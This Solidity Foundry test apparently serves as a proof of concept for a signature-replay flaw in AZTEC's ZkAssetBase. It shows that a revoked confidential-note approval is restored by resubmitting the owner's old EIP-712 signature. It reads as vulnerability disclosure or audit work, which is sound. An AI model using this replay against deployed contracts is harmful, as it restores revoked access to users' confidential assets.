pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IZkAssetBaseVulnerable_16739 {
    function EIP712_DOMAIN_HASH() external view returns (bytes32);
    function confidentialApprove(bytes32, address, bool, bytes calldata) external;
    function confidentialApproved(bytes32, address) external view returns (bool);
}

contract MockACE_16739 {
    address public noteOwner;

    function createNoteRegistry(address, uint256, bool, bool) external {}

    function setNoteOwner(address owner) external {
        noteOwner = owner;
    }

    function getNote(address, bytes32) external view returns (uint8, uint40, uint40, address) {
        return (1, 0, 0, noteOwner);
    }
}

contract PoC_16739 is Test {
    uint256 private constant OWNER_KEY = 0xA11CE;

    function test_signed_approval_replays_after_owner_revokes() public {
        address owner = vm.addr(OWNER_KEY);
        address spender = address(0xBEEF);
        MockACE_16739 ace = new MockACE_16739();
        IZkAssetBaseVulnerable_16739 asset = IZkAssetBaseVulnerable_16739(
            vm.deployCode(
                "out/ZkAssetBase.sol/ZkAssetBase.json",
                abi.encode(address(ace), address(0), uint256(1), false)
            )
        );
        ace.setNoteOwner(owner);

        bytes32 noteHash = keccak256("real AZTEC note coordinates");
        bytes32 noteTypeHash = keccak256("NoteSignature(bytes32 noteHash,address spender,bool spenderApproval)");
        bytes32 structHash = keccak256(abi.encode(noteTypeHash, noteHash, spender, true));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", asset.EIP712_DOMAIN_HASH(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, digest);
        bytes memory approvalSignature = abi.encodePacked(r, s, v);

        // The real signed approval is submitted by a relayer.
        vm.prank(address(0xCAFE));
        asset.confidentialApprove(noteHash, spender, true, approvalSignature);
        assertTrue(asset.confidentialApproved(noteHash, spender));

        // The note owner revokes permission through the supported empty-signature path.
        vm.prank(owner);
        asset.confidentialApprove(noteHash, spender, false, bytes(""));
        assertFalse(asset.confidentialApproved(noteHash, spender));

        // Vulnerable ZkAssetBase has no signature-consumption mapping. The old,
        // already-observed approval can therefore be replayed to restore access.
        vm.prank(address(0xCAFE));
        asset.confidentialApprove(noteHash, spender, true, approvalSignature);
        assertTrue(asset.confidentialApproved(noteHash, spender));
    }
}
